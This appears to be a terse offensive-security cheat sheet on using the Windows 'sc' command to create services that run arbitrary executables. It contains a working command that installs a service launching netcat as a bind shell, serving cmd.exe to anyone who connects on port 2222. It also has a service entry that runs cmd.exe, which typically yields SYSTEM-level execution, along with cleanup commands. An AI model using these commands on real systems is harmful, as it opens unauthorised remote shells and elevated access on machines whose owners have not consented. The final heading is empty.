# SC invoke service - executable
## cmd.exe 
- sc \\127.0.0.1 create cmd binpath= "cmd.exe"
- sc \\127.0.0.1 delete cmd 
## netcat
- sc \\127.0.0.1 create netcat binpath= "cmd.exe /k C:\tools\nc.exe -L -p 2222 -e cmd.exe"
- sc \\127.0.0.1 delete netcat 
## servify this